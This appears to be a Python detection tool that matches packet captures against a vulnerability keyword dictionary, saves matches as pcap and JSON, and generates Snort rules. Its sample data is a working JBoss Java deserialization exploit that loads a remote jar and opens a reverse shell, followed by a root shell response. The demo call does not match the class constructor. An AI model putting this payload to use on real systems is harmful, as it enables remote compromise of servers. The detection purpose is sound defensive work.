# coding=utf-8
# 按条件匹配
# desc: 写到多个pcap文件中去
from random import sample
from string import digits, ascii_lowercase
import os
import json
import dpkt
from conf.app import OUTPUT_DIR
from modules.snort_export import SnortExport
# from multiprocessing import Pool


# 保存json文件
def save_policyfile(policyfile, policy):
    try:
        with open(policyfile, 'w') as f:
            f.write(json.dumps(policy))
        f.close()
        return True
    except Exception as e:
        print('Failed save policy.json file, info:', e)
        os.remove(policyfile)
        return False


# 保存pcap文件
def save_pcapfile(pcapfile, buf_stream, buf_index, pcap_type):
    try:
        pcap = open(pcapfile, "wb")
        writer = dpkt.pcap.Writer(pcap)
        if pcap_type == 'single':                                # 单包
            eth = dpkt.ethernet.Ethernet(buf_stream[buf_index])
            writer.writepkt(eth)
            pcap.flush()
        else:                                                    # stream包
            for buf in buf_stream:
                eth = dpkt.ethernet.Ethernet(buf)
                writer.writepkt(eth)
                pcap.flush()

        writer.close()
        pcap.close()
        return True
    except Exception as e:
        print('Failed save pcapfile.pcap, info: ', e)
        os.remove(pcapfile)
        return False


# 产品产出(多线程)
def export_product(namepath, policy, stream_buf, buf_index, pcap_type, snort):
    """
    namepath: 文件名(不含后缀)
    policy: 策略数据
    stream_buf: stream包
    buf_index: stream包中恶意payload存在位置
    pcap_type: 单包还是多包
    """
    policy_file = namepath + '.json'
    pcap_file = namepath + '.pcap'
    if not save_policyfile(policy_file, policy):
        return
    if not save_pcapfile(pcap_file, stream_buf, buf_index, pcap_type):
        os.remove(policy_file)
        return
    if 'single' in pcap_type:
        print('单包无法输出snort规则, 已产出{},{}, 若要输出snort规则, 请使用<-t stream>')
        return
    if 'false' in snort:
        print('无需输出snort规则')
        return
    # snort规则输出
    se = SnortExport(pcap_file, policy_file)
    se.run()


class PcapParser:
    def __init__(self, stream_buf, old_pcap, pcap_type, datapath, multi_stream, snort):
        """
        stream_buf = {'seq': [buf,buf], 'seq': [buf, buf]}
        """
        self.stream_buf = stream_buf
        self.old_pcap = old_pcap
        self.pcap_type = pcap_type
        self.datapath = datapath
        self.multi_stream = multi_stream
        self.aspdata = self.__get_aspdata()
        self.protocol = 'tcp'
        self.snort = snort

    # output文件路径的新文件名(不含后缀)
    def rename(self):
        new_name = ''
        while True:
            prefix = '{}/{}_'.format(OUTPUT_DIR, self.old_pcap.split('/')[-1].split('.')[0])
            suffix = ''.join(sample(digits + ascii_lowercase, 10))
            new_name = prefix + suffix
            if not os.path.exists(new_name + '.pcap') and not os.path.exists(new_name + '.json'):
                return new_name

    def __get_aspdata(self):
        """
        读取json漏洞字典
        """
        try:
            with open(self.datapath, 'r') as f:
                aspect_data = f.read()
            f.close()
            return json.loads(aspect_data)
        except Exception as e:
            raise e

    def _plubic_parse(self, buf, array):
        """
        array: data.json数据中对应协议的特征数组
        """
        # 如果db没有特征数组, 则返回
        if not array:
            return False
        result = {}
        for item in array:
            pid = ''.join(sample(digits + ascii_lowercase, 10))
            sign = 0  # 匹配数0
            for key in item['keywords']:                    # todo全匹配还是部分匹配(写死全匹配)
                if key.encode() in buf:
                    sign += 1
            # full
            if len(item['keywords']) == sign and 'all' in item['keywords_count']:
                result[pid] = item
            # one of them
            elif len(item['keywords']) > 0 and 'all' not in item['keywords_count']:
                result[pid] = item
            # none
            else:
                continue
        return result

    def _protocol_parse(self, buf):
        """
        以协议将buf进行解析
        """
        if self.protocol == 'tcp':                              # tcp包括HTTP
            if not self.aspdata['tcp'] and not self.aspdata['http']:
                return False
            tcp_data = self._plubic_parse(buf, self.aspdata['tcp'])
            if not tcp_data:
                return self._plubic_parse(buf, self.aspdata['http'])
            return tcp_data

        elif self.protocol == 'http':
            if not self.aspdata['http']:
                return False
            http_data = self._plubic_parse(buf, self.aspdata['http'])
            return http_data

        elif self.protocol == 'udp':
            if not self.aspdata['udp']:
                return False
            udp_data = self._plubic_parse(buf, self.aspdata['udp'])
            return udp_data

        else:
            print("没有解析到data的协议数据")
            return False

    def run(self):
        for buf_array in self.stream_buf.values():
            buf_index = -1
            policy = None
            for index, buf in enumerate(buf_array):              # 一个array表示同一个流的关联包
                policy = self._protocol_parse(buf)
                if policy:                                       # 有一个包配对成功
                    buf_index = index
                    break
            if buf_index < 0:                                    # 配对成功
                continue
            # ready to run multiprocessing
            export_product(self.rename(), policy, buf_array, buf_index, self.pcap_type, self.snort)
            # self.save_pcap(buf_index, buf_array, policy)
            if self.multi_stream == 'false':                     # 是否是匹配即停止
                break

    def save_json(self, pcapname, data):
        dataname = '{}.json'.format(pcapname.split('.')[0])
        try:
            with open(dataname, 'w') as f:
                result = {'pcapfile': pcapname, 'pcap2snort': data}
                f.write(json.dumps(result))
            f.close()
        except Exception:
            os.remove(dataname)

    def save_pcap(self, buf_index, buf_stream, data):
        # print "buf_stream====>", buf_index, buf_stream, data
        pcap_name = ''
        if self.multi_stream == 'false':                         # 输出单个流的包, 首选用户指定命名、若空则使用系统自选命令
            pcap_name = self.new_pcap
        else:                                                    # 输出多个流的包, 使用系统自选命令
            pcap_name = self.rename()
        pcap = open(pcap_name, "wb")
        # save json
        self.save_json(pcap_name, data)

        # save pcap
        writer = dpkt.pcap.Writer(pcap)
        if self.pcap_type == 'single':                           # 单包
            eth = dpkt.ethernet.Ethernet(buf_stream[buf_index])
            writer.writepkt(eth)
            pcap.flush()
        else:                                                    # stream包
            for buf in buf_stream:
                eth = dpkt.ethernet.Ethernet(buf)
                writer.writepkt(eth)
                pcap.flush()

        writer.close()


if __name__ == "__main__":
    temp_buf = {
        '1001837255': [
            'RT\x00\x08M\x8dRT\x00!\x95(\x08\x00E\x00\x06\xf0\xac\xfe@\x00@\x06\xc9\x1c\xac\x1f2\xb2\xac\x1f2\xfc\xca\x14\x1f\x90;\xb6\xd2\xc8\xa76\xdaQ\x80\x18\x00\xe5\xc4\xcf\x00\x00\x01\x01\x08\n\x05$~;\x05#\x1a\xb7POST /invoker/readonly HTTP/1.1\r\nHost: 172.31.50.252:8080\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.25.0\r\nContent-Length: 1536\r\n\r\n\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x04sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantq\x00~\x00\x03xpvr\x00\x17java.net.URLClassLoader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00>org.apache.commons.collections.functors.InstantiateTransformer4\x8b\xf4\x7f\xa4\x86\xd0;\x02\x00\x02[\x00\x05iArgst\x00\x13[Ljava/lang/Object;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x0f[Ljava.net.URL;RQ\xfd$\xc5\x1bh\xcd\x02\x00\x00xp\x00\x00\x00\x01sr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x1cL\x00\x04hostq\x00~\x00\x1cL\x00\x08protocolq\x00~\x00\x1cL\x00\x03refq\x00~\x00\x1cxp\xff\xff\xff\xff\xff\xff\xff\xfft\x00\x12www.joaomatosf.comt\x00"/rnp/java_files/JexRemoteTools.jarq\x00~\x00\x1et\x00\x04httppxur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x01vq\x00~\x00\x19sr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgsq\x00~\x00\x14L\x00\x0biMethodNameq\x00~\x00\x1c[\x00\x0biParamTypesq\x00~\x00\x15xpuq\x00~\x00\x17\x00\x00\x00\x01t\x00\nJexReverset\x00\tloadClassuq\x00~\x00!\x00\x00\x00\x01vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpsq\x00~\x00\x13uq\x00~\x00\x17\x00\x00\x00\x02t\x00\r172.31.50.178sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x11\\uq\x00~\x00!\x00\x00\x00\x02q\x00~\x00+vr\x00\x03int\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10\x00\x00\x00\x00xxx',
            'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x004\xc0\xe6@\x00?\x06\xbc\xf0\xac\x1f2\xfc\xac\x1f2\xb2\x1f\x90\xca\x14\xa76\xdaQ;\xb6\xd9\x84\x80\x10\x00\xf6\xbe\x13\x00\x00\x01\x01\x08\n\x05#\x1a\xb7\x05$~;',
            'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x060\xc0\xe7@\x00?\x06\xb6\xf3\xac\x1f2\xfc\xac\x1f2\xb2\x1f\x90\xca\x14\xa76\xdaQ;\xb6\xd9\x84\x80\x18\x00\xf6\xc4\x0f\x00\x00\x01\x01\x08\n\x05#\x1c\xfb\x05$~;HTTP/1.1 500 Internal Server Error\r\nServer: Apache-Coyote/1.1\r\nContent-Type: text/html;charset=utf-8\r\nContent-Length: 1350\r\nDate: Sat, 28 Nov 2020 08:14:35 GMT\r\nConnection: close\r\n\r\n<html><head><title>JBoss Web/3.0.0-CR2 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Exception report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>The server encountered an internal error () that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.lang.ClassCastException: java.util.HashSet cannot be cast to org.jboss.invocation.MarshalledInvocation\n\torg.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)\n</pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the JBoss Web/3.0.0-CR2 logs.</u></p><HR size="1" noshade="noshade"><h3>JBoss Web/3.0.0-CR2</h3></body></html>'
        ],
        '136080189': [
            'RT\x00\x08M\x8dRT\x00!\x95(\x08\x00E\x00\x007e\xca@\x00@\x06\x17\n\xac\x1f2\xb2\xac\x1f2\xfc\x11\\ @r\xe8\xe5\xb8\x08\x1ck>\x80\x18\x00\xe3\xbe\x16\x00\x00\x01\x01\x08\n\x05$\x80r\x05#\x1c\xeeid\n',
            'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x004w\xd2@\x00?\x06\x06\x05\xac\x1f2\xfc\xac\x1f2\xb2 @\x11\\\x08\x1ck>r\xe8\xe5\xbb\x80\x10\x00\xdd\xbe\x13\x00\x00\x01\x01\x08\n\x05#\x1c\xee\x05$\x80r',
            'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x00[w\xd3@\x00?\x06\x05\xdd\xac\x1f2\xfc\xac\x1f2\xb2 @\x11\\\x08\x1ck>r\xe8\xe5\xbb\x80\x18\x00\xdd\xbe:\x00\x00\x01\x01\x08\n\x05#\x1d\x01\x05$\x80ruid=0(root) gid=0(root) groups=0(root)\n'
        ]
    }
    sbs = PcapParser(stream_buf=temp_buf, old_pcap='jboss.pcap', new_pcap='', pcap_type='stream', datapath='/home/pcap_filter/conf/data.json', multi_stream='false')
    sbs.run()
